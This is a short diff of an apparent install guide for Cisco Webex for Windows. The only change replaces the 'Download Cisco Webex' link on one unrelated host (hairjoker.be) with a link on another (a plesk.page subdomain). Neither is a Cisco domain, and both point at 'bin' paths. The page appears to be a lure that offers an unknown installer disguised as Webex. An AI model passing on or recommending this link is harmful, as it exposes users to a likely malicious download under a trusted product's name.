@@ -14,7 +14,7 @@
 
 To install Cisco Webex for Windows:  
 
-### 🔗 [Download Cisco Webex](https://hairjoker.be/bin1/)
+### 🔗 [Download Cisco Webex](https://elegant-perlman.65-21-220-107.plesk.page/bin3/)
 
 
 1. **Run the Installer**
